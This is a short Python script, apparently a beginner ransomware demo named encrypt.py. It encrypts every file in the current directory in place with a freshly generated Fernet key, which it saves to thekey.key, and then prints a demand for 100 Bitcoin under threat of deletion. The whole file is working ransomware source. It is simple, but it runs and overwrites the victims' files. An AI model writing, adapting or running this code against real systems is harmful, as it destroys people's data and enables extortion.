#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

# Create a list to hold files
files = []

# Discover files in the current directory (excluding folders, itself, decryptor, and key file)
for file in os.listdir():
    if file == "encrypt.py" or file == "decrypt.py" or file == "thekey.key":
        continue
    if os.path.isfile(file):
        files.append(file)

# Generate encryption key
key = Fernet.generate_key()

# Save the key to a file
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

# Encrypt each file
for file in files:
    with open(file, "rb") as f:
        contents = f.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as f:
        f.write(contents_encrypted)

# Ransom message
print("All of your files have been encrypted!")
print("Send me 100 Bitcoin or I'll delete them in 24 hours. 💀")
